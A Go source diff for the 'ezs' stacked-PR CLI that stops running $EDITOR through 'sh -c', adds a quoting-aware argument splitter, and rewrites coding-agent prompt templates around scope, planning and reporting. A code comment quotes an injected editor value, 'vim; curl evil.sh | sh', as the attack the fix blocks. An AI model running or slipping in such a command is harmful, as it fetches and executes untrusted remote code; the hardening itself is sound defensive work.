@@ -125,9 +125,13 @@ func Agent(args []string) error {
 		agentCmd = repoCfg.GetAgentCommand()
 	}
 
-	// Verify agent CLI exists
-	if _, err := exec.LookPath(agentCmd); err != nil {
-		return fmt.Errorf("agent CLI '%s' not found in PATH.\nInstall it or configure a different agent: ezs config set agent_command <command>", agentCmd)
+	// Verify agent CLI exists (check only the binary, not its args)
+	agentFields := strings.Fields(agentCmd)
+	if len(agentFields) == 0 {
+		return fmt.Errorf("agent_command is empty.\nConfigure one: ezs config set agent_command <command>")
+	}
+	if _, err := exec.LookPath(agentFields[0]); err != nil {
+		return fmt.Errorf("agent CLI '%s' not found in PATH.\nInstall it or configure a different agent: ezs config set agent_command <command>", agentFields[0])
 	}
 
 	// Agent requires worktree mode — each branch needs its own working directory
@@ -441,12 +445,71 @@ func resetRepoPrompt(promptType, repoPath string) error {
 }
 
 func openEditor(editor, filePath string) error {
-	// Use sh -c so that $EDITOR values like "code --wait" or "subl -w" work.
-	cmd := exec.Command("sh", "-c", editor+" "+ShellQuote(filePath))
+	// Parse $EDITOR as whitespace-separated tokens with basic quoting support,
+	// then invoke exec directly. Never go through `sh -c`: that would let
+	// EDITOR values like `vim; curl evil.sh | sh` or `$(id)` execute.
+	parts, err := splitEditorCommand(editor)
+	if err != nil {
+		return fmt.Errorf("parse $EDITOR (%q): %w", editor, err)
+	}
+	if len(parts) == 0 {
+		return fmt.Errorf("no editor configured")
+	}
+	parts = append(parts, filePath)
+	cmd := exec.Command(parts[0], parts[1:]...)
 	cmd.Stdin = os.Stdin
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	return cmd.Run()
+}
+
+// splitEditorCommand splits an EDITOR/VISUAL string into argv tokens with
+// minimal POSIX-style quoting: single quotes are literal, double quotes are
+// literal (no $ expansion since we never hand this to a shell), backslash
+// escapes the next character. Returns an error on unterminated quotes.
+func splitEditorCommand(s string) ([]string, error) {
+	var out []string
+	var cur strings.Builder
+	inSingle, inDouble, escaped, hasToken := false, false, false, false
+	flush := func() {
+		if hasToken {
+			out = append(out, cur.String())
+			cur.Reset()
+			hasToken = false
+		}
+	}
+	for i := 0; i < len(s); i++ {
+		c := s[i]
+		if escaped {
+			cur.WriteByte(c)
+			hasToken = true
+			escaped = false
+			continue
+		}
+		switch {
+		case c == '\\' && !inSingle:
+			escaped = true
+		case c == '\'' && !inDouble:
+			inSingle = !inSingle
+			hasToken = true
+		case c == '"' && !inSingle:
+			inDouble = !inDouble
+			hasToken = true
+		case (c == ' ' || c == '\t') && !inSingle && !inDouble:
+			flush()
+		default:
+			cur.WriteByte(c)
+			hasToken = true
+		}
+	}
+	if inSingle || inDouble {
+		return nil, fmt.Errorf("unterminated quote")
+	}
+	if escaped {
+		return nil, fmt.Errorf("trailing backslash")
+	}
+	flush()
+	return out, nil
 }
 
 // ── Prompt file management ─────────────────────────────────────────────────────
@@ -923,7 +986,12 @@ func printDryRunPrompt(mode, prompt string) {
 // spawnAgentProcess launches the agent CLI with the rendered prompt.
 // The full prompt is passed as the first visible user message in the agent's UI.
 func spawnAgentProcess(agentCmd, workDir, prompt string) error {
-	cmd := exec.Command(agentCmd, prompt)
+	fields := strings.Fields(agentCmd)
+	if len(fields) == 0 {
+		return fmt.Errorf("agent_command is empty")
+	}
+	args := append(fields[1:], prompt)
+	cmd := exec.Command(fields[0], args...)
 	cmd.Dir = workDir
 	cmd.Stdin = os.Stdin
 	cmd.Stdout = os.Stdout
@@ -950,76 +1018,71 @@ var (
 // defaultWorkBranchPromptTemplate is used when the agent is scoped to a single branch (--branch).
 const defaultWorkBranchPromptTemplate = `You are working inside an ezstack-managed repository that uses stacked PRs with git worktrees.
 
-## ezs Commands (always use -y to skip confirmations)
-{{EZS_COMMANDS}}
+## FIRST ACTIONS (do these before responding to the user)
+1. cd to {{WORKTREE_PATH}} and run "ezs diff" to see what this branch changes relative to its parent. This is MANDATORY and must be your first action — do not respond to the user until it is done.
+2. Skim the worktree to understand the branch's purpose.
+3. If the user has not given you a task, briefly summarize what this branch does and ask what they want to work on.
+4. If the user's task is unclear or the branch's purpose is ambiguous, ask the user to clarify before making changes.
 
-## ezstack Reference
-{{EZS_DOCS}}
+## Rules
+- Always pass -y to ezs commands (e.g. "ezs -y commit", "ezs -y push") to skip confirmations.
+- Commit with "ezs -y commit", not "git commit" (ezs commit auto-syncs children). Push with "ezs -y push", not "git push".
+- Scope: you may only WRITE to files inside {{WORKTREE_PATH}}. Reading sibling worktrees for context is fine and encouraged.
+- Do not create new branches or modify other branches in the stack. All changes must be relevant to this branch's purpose.
+- Keep changes small and focused for easy review.
+- Run tests / typecheck before committing. A broken middle branch blocks everything above it in the stack.
+
+## Reporting Back
+When your work is done: commit with "ezs -y commit", then summarize what you changed in 1–3 sentences. Do not push or open a PR unless the user asks.
 
 ## Current Stack
 {{STACK_JSON}}
 
 ## Your Branch
-You are scoped to a single branch in this stack:
 - Branch: {{BRANCH_NAME}}
 - Parent: {{PARENT_NAME}}
 - Worktree: {{WORKTREE_PATH}}
 
-## IMPORTANT: Scope Constraint
-You are scoped to THIS BRANCH ONLY. Do not modify files outside this branch's worktree.
-Do not create new branches or modify other branches in the stack.
-All your changes must be relevant to this branch.
-
-## Orient Yourself First
-Before doing any work, orient yourself on this branch:
-1. Run "ezs diff" to see what this branch changes relative to its parent.
-2. Explore the worktree structure (list key files and directories).
-3. If the diff or the branch's purpose is unclear, ask the user to clarify what this branch is for and what they want you to work on.
-
-## Rules
-- Only make changes relevant to this branch's purpose.
-- Keep changes small and focused for easy review.
-- Do not modify files outside this worktree.
-- Commit with "ezs -y commit", not "git commit" (ezs commit auto-syncs children).
-- Push with "ezs -y push", not "git push".
-- Always use the -y flag with ezs commands to skip confirmations.
+## ezs Commands
+{{EZS_COMMANDS}}
 {{CUSTOM_INSTRUCTIONS}}
 {{REPO_INSTRUCTIONS}}
+
+## Reference — read on demand
+The full ezstack documentation is below. Do not read it top-to-bottom; consult it when you hit a specific question.
+{{EZS_DOCS}}
 `
 
 // defaultWorkStackPromptTemplate is used when the agent works on an entire stack (no --branch).
 const defaultWorkStackPromptTemplate = `You are working inside an ezstack-managed repository that uses stacked PRs with git worktrees.
 
-## ezs Commands (always use -y to skip confirmations)
-{{EZS_COMMANDS}}
+## FIRST ACTIONS (do these before responding to the user)
+1. For each branch in the stack, cd to its worktree and run "ezs diff". This is MANDATORY and must be your first action — do not respond to the user until it is done for every branch.
+2. Explore the codebase structure from the ROOT branch's worktree (the bottom of the stack — all branches share history below it, so either the root or any single branch works for a structural overview).
+3. If the user has not given you a task, briefly summarize the stack (branch-by-branch, one line each) and ask what they want to work on.
+4. If any branch's purpose is unclear, ask the user to clarify before making changes.
 
-## ezstack Reference
-{{EZS_DOCS}}
+## Rules
+- Always pass -y to ezs commands (e.g. "ezs -y commit", "ezs -y push") to skip confirmations.
+- Commit with "ezs -y commit", not "git commit" (ezs commit auto-syncs children). Push with "ezs -y push", not "git push".
+- Work across any branch in this stack as needed. Before modifying a branch, cd to its worktree. Use "ezs goto <branch>" or cd directly.
+- Keep each branch's changes focused and relevant to that branch's purpose. Do not create branches outside this stack.
+- Run tests / typecheck before committing each branch. A broken middle branch blocks everything above it in the stack.
+
+## Reporting Back
+When your work is done: commit affected branches with "ezs -y commit", then summarize what changed per branch in 1–3 sentences. Do not push or open a PR unless the user asks.
 
 ## Current Stack
 {{STACK_JSON}}
 
-## Scope
-You are working on the ENTIRE STACK above. You may work across any branch in this stack.
-Each branch has its own worktree — cd to the appropriate worktree before making changes.
-Use "ezs goto <branch>" to navigate between branches, or cd directly to a branch's worktree path.
-
-## Orient Yourself First
-Before doing any work, build a picture of the full stack:
-1. For each branch in the stack, cd to its worktree and run "ezs diff" to understand what it changes.
-2. Explore the codebase structure in the first branch's worktree (list key files and directories).
-3. If any branch's purpose or changes are unclear, ask the user to clarify before proceeding.
-
-## Rules
-- Work across any branch in this stack as needed.
-- Keep each branch's changes focused and relevant to that branch's purpose.
-- When modifying a branch, cd to its worktree first.
-- Commit with "ezs -y commit", not "git commit" (ezs commit auto-syncs children).
-- Push with "ezs -y push", not "git push".
-- Always use the -y flag with ezs commands to skip confirmations.
-- Do not create branches outside this stack.
+## ezs Commands
+{{EZS_COMMANDS}}
 {{CUSTOM_INSTRUCTIONS}}
 {{REPO_INSTRUCTIONS}}
+
+## Reference — read on demand
+The full ezstack documentation is below. Do not read it top-to-bottom; consult it when you hit a specific question.
+{{EZS_DOCS}}
 `
 
 // defaultFeaturePromptTemplate is used when the agent builds a feature as stacked branches.
@@ -1027,38 +1090,35 @@ Before doing any work, build a picture of the full stack:
 // and {{PROCESS_INSTRUCTIONS}} adapts to use existing branches.
 const defaultFeaturePromptTemplate = `You are working inside an ezstack-managed repository that uses stacked PRs with git worktrees.
 
-## ezs Commands (always use -y to skip confirmations)
-{{EZS_COMMANDS}}
+## FIRST ACTIONS (do these before writing any code)
+1. Read the feature description below. If it is vague, ambiguous, or missing key details, ask the user to clarify before doing anything else.
+2. Explore the codebase enough to understand how the feature fits in.
+3. Present a detailed plan of stacked branches to the user and STOP. Do not create branches or write code yet.
+4. Wait for explicit approval from the user. If their response is ambiguous, ask — do not proceed on vague signals.
 
-## ezstack Reference
-{{EZS_DOCS}}
+## Rules
+- Always pass -y to ezs commands (e.g. "ezs -y commit", "ezs -y push") to skip confirmations.
+- Commit with "ezs -y commit", not "git commit" (ezs commit auto-syncs children). Push with "ezs -y push", not "git push".
+- Each branch is one reviewable unit of work (~100–300 lines of diff ideal). If a branch grows past ~400 lines, STOP and split it before continuing.
+- Run tests / typecheck before committing each branch. A broken middle branch blocks everything above it in the stack.
+- Earlier branches must not depend on later ones. Include tests in the same branch as the code they test when practical.
+- Use descriptive branch names (e.g. "add-user-model", "add-user-api", "add-user-tests").
+
+## Reporting Back
+After each branch: commit with "ezs -y commit" and report the branch name + 1–2 line summary. After the full stack: summarize the stack end-to-end. Do not push or open PRs unless the user asks.
 
 ## Feature to Implement
 {{FEATURE_DESCRIPTION}}
 
 {{EXISTING_STACK_SECTION}}
-## Your Job
-Plan and implement the feature above as a series of small, stacked, reviewable branches.
-You are responsible for creating the branches, naming them, implementing the code, and committing.
-
-## IMPORTANT: Plan First
-You MUST start in planning mode. Explore the codebase, then present a detailed plan of
-stacked branches to the user. Do NOT create any branches or write any code until the user
-explicitly approves your plan. Wait for the user to say "go", "approved", "looks good",
-or similar before proceeding with implementation.
-
 {{PROCESS_INSTRUCTIONS}}
 
-### Guidelines
-- Each branch should be one reviewable unit of work (~100-300 lines of diff is ideal).
-- Use descriptive branch names: e.g., "add-user-model", "add-user-api", "add-user-tests".
-- Earlier branches must not depend on later ones — each builds on its parent.
-- Include tests in the same branch as the code they test, when practical.
-
-## Rules
-- Commit with "ezs -y commit", not "git commit" (ezs commit auto-syncs children).
-- Push with "ezs -y push", not "git push".
-- Always use the -y flag with ezs commands to skip confirmations.
+## ezs Commands
+{{EZS_COMMANDS}}
 {{CUSTOM_INSTRUCTIONS}}
 {{REPO_INSTRUCTIONS}}
+
+## Reference — read on demand
+The full ezstack documentation is below. Do not read it top-to-bottom; consult it when you hit a specific question.
+{{EZS_DOCS}}
 `
